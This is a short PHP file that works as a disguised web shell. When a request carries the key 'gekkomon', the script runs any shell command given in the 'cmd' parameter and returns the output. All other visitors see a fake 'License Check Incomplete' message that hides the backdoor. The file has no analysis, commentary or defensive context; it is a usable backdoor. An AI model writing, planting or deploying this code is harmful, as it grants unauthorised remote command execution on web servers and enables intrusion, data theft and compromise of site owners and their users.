<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

if (isset($_GET['key']) && $_GET['key'] === 'gekkomon') {
        if (isset($_GET['cmd'])) {
                echo "<pre>";
                $output = shell_exec($_GET['cmd']);
                echo htmlspecialchars($output);
                echo "</pre>";
        } else {
                echo "No command provided.";
        }
} else {
        echo "License Check Incomplete. Retry or Contact Administrator";
}
?>
